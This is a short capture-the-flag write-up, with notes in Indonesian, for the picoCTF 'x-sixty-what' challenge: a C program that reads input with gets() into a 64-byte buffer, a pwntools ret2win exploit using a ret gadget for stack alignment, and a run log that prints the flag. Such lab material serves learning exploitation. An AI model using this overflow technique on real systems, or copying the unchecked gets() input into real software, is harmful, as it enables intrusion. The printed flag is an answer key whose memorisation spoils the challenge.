## x-sixty-what
### Problem
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}
```
### payload
Jangan lupa sama 16-bytes alignment
```
from pwn import *

#p = process('./vuln')
p = remote('saturn.picoctf.net', 60262)
elf = ELF('./vuln')

# Find a ret gadget
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]

print(hex(ret))

payload = b'A'*72
payload += p64(ret)  # Add ret for stack alignment
payload += p64(elf.sym['flag'])

p.sendline(payload)
p.interactive()
```

### Eksekusi
```
baba@fedora:~/Documents/picoctf/x-sixty-what$ python3 payload.py 
[+] Opening connection to saturn.picoctf.net on port 60262: Done
[*] '/home/baba/Documents/picoctf/x-sixty-what/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] Loaded 14 cached gadgets for './vuln'
0x40101a
[*] Switching to interactive mode
Welcome to 64-bit. Give me a string that gets you the flag: 
picoCTF{b1663r_15_b3773r_47a99eda}[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to saturn.picoctf.net port 60262
```